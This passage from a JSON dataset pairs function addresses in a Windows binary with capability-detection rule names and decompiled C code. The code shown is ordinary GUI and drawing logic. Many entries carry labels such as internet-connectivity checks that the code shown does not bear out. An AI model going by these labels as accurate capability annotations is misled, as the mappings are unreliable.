        "decompiled_code": "\nvoid __cdecl fcn.0045211c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    piVar3 = arg_8h + -4;\n    iVar1 = *(*piVar3 + 0x18);\n    if (*(*(*(*piVar3 + 0x60) + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.0044f4d0();\n        if (*(*piVar3 + 0x54) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x54) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.00451980();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x54)) {\n            *(*piVar3 + 0x54) = iVar2 - iVar1;\n        }\n    }\n    else {\n        iVar2 = fcn.0044f4d0();\n        if (*(*piVar3 + 0x50) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x50) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.00451980();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x50)) {\n            *(*piVar3 + 0x50) = iVar2 - iVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 327
    },
    "004521ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004521ac(uint noname_0, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.00451804();\n        fcn.00413a6c();\n        *(in_EAX + 0x50) = var_ch;\n        *(in_EAX + 0x54) = var_8h;\n        fcn.0045211c(&stack0xfffffffc);\n        fcn.00451804();\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "004521fc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004521fc(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char in_DL;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if (in_DL == '\\0') {\n        if (*(in_EAX + 0x60) == 0) {\n            fcn.00413a6c();\n            iVar2 = fcn.00450460();\n            if ((iVar2 != 0) && (var_4h == 0x14)) {\n                cVar1 = fcn.004040e4();\n                if (cVar1 == '\\0') {\n                    fcn.004454cc();\n                }\n                else {\n                    fcn.0045e8a8();\n                }\n            }\n        }\n        else {\n            fcn.0045173c();\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00452364": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00452364(uint param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    *(in_EAX + 4) = 1;\n    *(in_EAX + 8) = 5;\n    if (((**0x492cfc == 2) && (3 < **0x4929cc)) ||\n       ((**0x492cfc == 1 && ((4 < **0x4929cc || ((**0x4929cc == 4 && (9 < **0x492bbc)))))))) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    *(in_EAX + 0xd) = uVar1;\n    fcn.00452554();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 281
    },
    "004523f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004523f4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x2c) != 0) && (*(in_EAX + 0x20) != '\\0')) {\n        fcn.00452534();\n        uVar1 = (**(*(in_EAX + 0x2c) + 0x2c))();\n        *(in_EAX + 0x28) = uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 127
    },
    "00452468": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.00452468(void)\n\n{\n    return *0x496534 != '\\0';\n}\n",
        "token_count": 23
    },
    "00452498": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00452498(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (***0x4929e4)(0x13);\n    *(in_EAX + 0xc) = '\\x01' - (iVar1 == 0);\n    return;\n}\n",
        "token_count": 71
    },
    "004524b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004524b4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = (***0x4929e4)(0x4b);\n    cVar2 = '\\x01' - (iVar1 == 0);\n    *(in_EAX + 0x20) = cVar2;\n    if (cVar2 != '\\0') {\n        sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004524e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004524e4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = fcn.0040780c(in_EAX + 0x10, auStack8);\n    *(in_EAX + 0x18) = uVar1;\n    *(in_EAX + 0x20) = *(in_EAX + 0x1c) != 0;\n    return;\n}\n",
        "token_count": 107
    },
    "00452554": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452554(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        fcn.00452498();\n        if (*(in_EAX + 0xd) != '\\0') {\n            fcn.004524b4();\n            return;\n        }\n        fcn.004524e4();\n    }\n    else if ((param_2 == 0x68) && (*(in_EAX + 0x20) != '\\0')) {\n        if (*(in_EAX + 0xd) == '\\0') {\n            uVar1 = sub.user32.dll_SendMessageA(*(in_EAX + 0x18), *(in_EAX + 0x14), 0, 0);\n            *(in_EAX + 0x10) = uVar1;\n        }\n        else {\n            sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "004525b8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004525b8(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint uMode;\n    \n    if (*(*0x492d08 + 0xc) != '\\0') {\n        uStack16 = 0x8000;\n        puStack20 = 0x4525d6;\n        uVar1 = sub.kernel32.dll_SetErrorMode();\n        uStack24 = 0x45271e;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (*0x49654c == 0) {\n            puStack20 = &stack0xfffffffc;\n            in_stack_ffffffd8 = sub.kernel32.dll_GetModuleHandleA_2(0x45272c);\n            *0x49654c = sub.kernel32.dll_GetProcAddress_1(in_stack_ffffffd8, 0x452734);\n        }\n        if (*0x491708 == 0) {\n            *0x491708 = sub.kernel32.dll_LoadLibraryA(0x452744);\n            if (*0x491708 != 0) {\n                *0x496550 = sub.kernel32.dll_GetProcAddress_1(*0x491708, 0x452750);\n                *0x496554 = sub.kernel32.dll_GetProcAddress_1(*0x491708, 0x452760);\n                *0x496558 = sub.kernel32.dll_GetProcAddress_1(*0x491708, 0x452774);\n                *0x49655c = sub.kernel32.dll_GetProcAddress_1(*0x491708, 0x45278c);\n                *0x496560 = sub.kernel32.dll_GetProcAddress_1(*0x491708, 0x4527a4);\n                *0x496564 = sub.kernel32.dll_GetProcAddress_1(*0x491708, 0x4527b8);\n                *0x496568 = sub.kernel32.dll_GetProcAddress_1(*0x491708, 0x4527d0);\n                *0x49656c = sub.kernel32.dll_GetProcAddress_1(*0x491708, 0x4527e8);\n                *0x496570 = sub.kernel32.dll_GetProcAddress_1(*0x491708, 0x452804);\n                *0x496574 = sub.kernel32.dll_GetProcAddress_1(*0x491708, 0x452810);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        sub.kernel32.dll_SetErrorMode(uVar1, 0x452725);\n        return;\n    }\n    return;\n}\n",
        "token_count": 616
    },
    "00452820": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00452820(void)\n\n{\n    uint uVar1;\n    \n    if (*0x49654c != NULL) {\n        uVar1 = (**0x49654c)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 56
    },
    "0045283c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045283c(uint param_1, uint8_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uchar auStack20 [8];\n    \n    if ((*(*0x492d08 + 0xc) != '\\0') && (param_2 != 3)) {\n        if (param_2 == 0) {\n            uStack24 = 0x45286b;\n            fcn.00452820();\n        }\n        else {\n            uStack24 = 0x452879;\n            fcn.00452820();\n            if (*0x491708 != 0) {\n                puStack28 = 0x45288d;\n                puStack32 = &stack0xffffffe8;\n                uVar1 = (**0x496550)();\n                if (uVar1 != 0) {\n                    puStack28 = &stack0xffffffec;\n                    uStack40 = 0x4528a4;\n                    uStack36 = uVar1;\n                    (**0x496558)();\n                    uStack44 = uVar1;\n                    if (param_2 == 1) {\n                        uStack40 = 0;\n                        (**0x496560)();\n                    }\n                    else if (param_2 == 2) {\n                        uStack40 = 1;\n                        (**0x496560)();\n                    }\n                    else {\n                        uStack40 = 1;\n                        (**0x496560)();\n                        (**0x496558)(uVar1, &stack0xffffffd4, &stack0xffffffd8);\n                        uStack44 = uStack44 & 0xfffffff4 | *(param_2 + 0x491708);\n                    }\n                    (**0x49655c)(uVar1, uStack44, uStack40);\n                    (**0x496554)();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 440
    },
    "00452914": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00452914(void)\n\n{\n    uint uVar1;\n    \n    if (*0x491708 != 0) {\n        uVar1 = (**0x496570)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 55
    },
    "00452928": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00452928(void)\n\n{\n    fcn.00403f58();\n    **0x492b60 = 0;\n    fcn.00403f58();\n    **0x492ce0 = 0;\n    fcn.00403f58();\n    *0x4964f0 = 0;\n    fcn.00403f58();\n    sub.kernel32.dll_GlobalDeleteAtom(*0x496506);\n    fcn.00404da0();\n    sub.kernel32.dll_GlobalDeleteAtom(*0x496504);\n    fcn.00404da0();\n    if (*0x491708 != 0) {\n        sub.kernel32.dll_FreeLibrary_1(*0x491708);\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "00452c94": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00452c94(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar2 = *(in_EAX + 4);\n    if (iVar2 != 0) {\n        if (arg_8h != '\\0') {\n            *(iVar2 + 0x164) = 1;\n            *(iVar2 + 0x54) = *(iVar2 + 0x54) | 0x4000;\n        }\n        uStack28 = 0x452d6f;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &iStack32;\n        cVar3 = fcn.00448264();\n        if ((cVar3 == '\\0') || (*(*(in_EAX + 4) + 0x30) == 0)) {\n            (**(**(in_EAX + 4) + 0x88))(arg_ch, arg_10h);\n        }\n        else {\n            arg_ch = arg_ch - (*(in_EAX + 0xc) + *(in_EAX + 0x14));\n            (**(**(in_EAX + 4) + 0x88))(arg_ch, arg_10h - (*(in_EAX + 8) + *(in_EAX + 0x10)));\n        }\n        *in_FS_OFFSET = arg_ch;\n        if (arg_8h != '\\0') {\n            iVar2 = *(in_EAX + 4);\n            *(iVar2 + 0x164) = 0;\n            puVar1 = iVar2 + 0x54;\n            *puVar1 = *puVar1 & 0xbfff;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 455
    },
    "0045326c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045326c(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404324();\n    while (0 < *(*(iVar1 + 0x4c) + 8)) {\n        fcn.00414fd4();\n        fcn.00454244();\n    }\n    fcn.00403f58();\n    fcn.004535c8();\n    fcn.00403f58();\n    *(iVar1 + 0x4c) = 0;\n    if (*(iVar1 + 0x54) != 0) {\n        fcn.00403f58();\n    }\n    fcn.0041b558();\n    if ('\\0' < extraout_DL) {\n        fcn.004042cc();\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "004532d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004532d8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x453385;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 0x4c) = uVar1;\n    if (((*(in_EAX + 0x30) < 1) || (0x8000 < *(in_EAX + 0x30))) || (*(in_EAX + 0x34) < 1)) {\n        fcn.00406a50();\n        fcn.0040c5ac();\n        fcn.004047cc();\n    }\n    *(in_EAX + 0x38) = 4;\n    *(in_EAX + 0x41) = 1;\n    fcn.004541cc();\n    *(in_EAX + 0x43) = 0;\n    *(in_EAX + 0x44) = 0x1fffffff;\n    *(in_EAX + 0x48) = 0x1fffffff;\n    uVar1 = fcn.00426010();\n    *(in_EAX + 0x50) = uVar1;\n    fcn.004533a4();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x45338c;\n    uStack20 = 0x453384;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 386
    },
    "00453390": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00453390(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x3c) != 0;\n}\n",
        "token_count": 49
    },
    "00453398": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00453398(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x3c) == 0) {\n        fcn.00453600();\n    }\n    return;\n}\n",
        "token_count": 52
    },
    "00453574": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453574(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.00454154();\n    if (param_2 == NULL) {\n        (**(**(in_EAX + 0x50) + 0x68))();\n    }\n    else {\n        cVar1 = fcn.00426650();\n        if (cVar1 == '\\x01') {\n            (**(*param_2 + 0x68))();\n        }\n        else {\n            (**(*param_1 + 8))();\n            (**(*param_1 + 0x70))();\n            (**(*param_1 + 0x68))();\n        }\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "004535c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004535c8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    cVar1 = fcn.00453390();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x42) == '\\0')) {\n        uVar2 = fcn.00453564();\n        sub.comctl32.dll_ImageList_Destroy(uVar2);\n    }\n    *(in_EAX + 0x3c) = 0;\n    fcn.00404154();\n    return;\n}\n",
        "token_count": 126
    },
    "0045376c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045376c(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x453787;\n    fcn.00426010();\n    uStack36 = 0x45386b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if ((*(in_EAX + 0x41) != '\\0') && (param_1 != -1)) {\n        puStack44 = 0x4537ba;\n        puStack32 = &stack0xfffffffc;\n        piVar1 = fcn.00426010();\n        uStack48 = 0x45382d;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        puStack44 = &stack0xfffffffc;\n        (**(*piVar1 + 8))();\n        fcn.0042772c();\n        fcn.00453398();\n        (**(*piVar1 + 0x6c))();\n        uVar2 = fcn.00453554();\n        uVar3 = fcn.00453574(uVar2);\n        uVar2 = *(in_EAX + 0x3c);\n        sub.comctl32.dll_ImageList_Add(uVar2, uVar3);\n        *in_FS_OFFSET = uVar2;\n        fcn.00403f58(0x453855);\n        return;\n    }\n    puStack44 = NULL;\n    uStack48 = 0x453843;\n    puStack32 = &stack0xfffffffc;\n    uStack48 = fcn.00453574();\n    uStack52 = 0x45384c;\n    uStack52 = fcn.00453564();\n    sub.comctl32.dll_ImageList_Add();\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x453872;\n    uStack48 = 0x45386a;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 533
    },
    "00453bcc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453bcc(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    uint in_EDX;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.00453390();\n    if (cVar1 != '\\0') {\n        if (arg_8h == '\\0') {\n            if (*(in_EAX + 0x54) == 0) {\n                piVar3 = fcn.00426010();\n                *(in_EAX + 0x54) = piVar3;\n                fcn.00427474();\n                (**(*piVar3 + 0x40))();\n                (**(*piVar3 + 0x34))();\n            }\n            fcn.004265e4();\n            fcn.004214d4();\n            fcn.00413a94(&var_28h, *(in_EAX + 0x30));\n            fcn.004265e4(&var_28h);\n            fcn.00421878();\n            fcn.004265e4(0, 0, 0, 0, 0xffffffff, 0, 0);\n            uVar2 = fcn.00421c8c();\n            uVar2 = fcn.00453564(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n            fcn.00413a94(&var_18h, arg_10h + *(in_EAX + 0x30));\n            fcn.004265e4();\n            var_8h = fcn.00421c8c();\n            fcn.004214d4();\n            uVar2 = fcn.00421c8c();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt\n                      (uVar2, arg_14h + 1, arg_10h + 1, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n            fcn.004214d4();\n            uVar2 = fcn.00421c8c();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt(uVar2, arg_14h, arg_10h, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n        }\n        else {\n            uVar2 = fcn.0045318c(arg_ch);\n            fcn.00453ba4(uVar2);\n            uVar2 = fcn.0045318c();\n            uVar2 = fcn.00421c8c(arg_14h, arg_10h, 0, 0, uVar2);\n            uVar2 = fcn.00453564(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 785
    },
    "004543d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004543d0(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        iVar2 = fcn.00453888();\n        return 0 < iVar2;\n    }\n    cVar1 = fcn.004040e4();\n    if ((cVar1 != '\\0') && (cVar1 = fcn.004542e0(),  cVar1 != '\\0')) {\n        return false;\n    }\n    return true;\n}\n",
        "token_count": 135
    },
    "00454484": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00454484(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    int32_t iStack112;\n    uint uStack108;\n    uchar *puStack104;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_30h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    puStack84 = 0x4544a1;\n    var_4h = in_EAX;\n    fcn.0041775c();\n    puStack84 = 0x4544b0;\n    fcn.0041775c();\n    puStack84 = 0x4544bc;\n    var_8h = fcn.00426010();\n    uStack88 = 0x454708;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = fcn.00417530();\n    (**(*var_8h + 0x54))();\n    puStack104 = 0x4544ef;\n    fcn.00417550(var_18h + iVar1, var_18h + iVar1 >> 0x1f);\n    puStack104 = 0x4544fb;\n    var_10h = fcn.00426010();\n    uStack108 = 0x4546eb;\n    iStack112 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff90;\n    puStack104 = &stack0xfffffffc;\n    (**(*var_10h + 0x54))();\n    var_ch = fcn.00426010();\n    (**(*var_ch + 0x40))();\n    (**(*var_ch + 0x34))();\n    var_14h = fcn.00426010();\n    fcn.00427474();\n    (**(*var_14h + 0x40))();\n    (**(*var_14h + 0x34))();\n    fcn.00413a94(&fcn.00454484::var_30h, *(var_4h + 0x30));\n    fcn.00454ab0();\n    puVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar1 = (**(*var_8h + 0x20))();\n    iVar1 = iVar1 / *(var_4h + 0x30);\n    if (-1 < iVar1 + -1) {\n        do {\n            var_20h = iVar1;\n            if (var_1ch == 0) break;\n            iVar1 = (**(*var_8h + 0x2c))();\n            iVar1 = iVar1 / *(var_4h + 0x34);\n            if (-1 < iVar1 + -1) {\n                do {\n                    if (var_1ch == 0) break;\n                    fcn.00413abc(&fcn.00454484::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.00454484::var_40h;\n                    uVar2 = fcn.004265e4();\n                    fcn.004265e4(uVar2);\n                    fcn.00421744(puVar3);\n                    fcn.00413abc(&fcn.00454484::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.00454484::var_40h;\n                    uVar2 = fcn.004265e4();\n                    fcn.004265e4(uVar2);\n                    fcn.00421744(puVar3);\n                    fcn.004536a0();\n                    var_1ch = var_1ch + -1;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n            }\n            var_20h = var_20h + -1;\n            iVar1 = var_20h;\n        } while (var_20h != 0);\n    }\n    *in_FS_OFFSET = puVar3;\n    fcn.00403f58();\n    fcn.00403f58();\n    fcn.00454ab4();\n    return;\n}\n",
        "token_count": 1027
    },
    "0045496c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
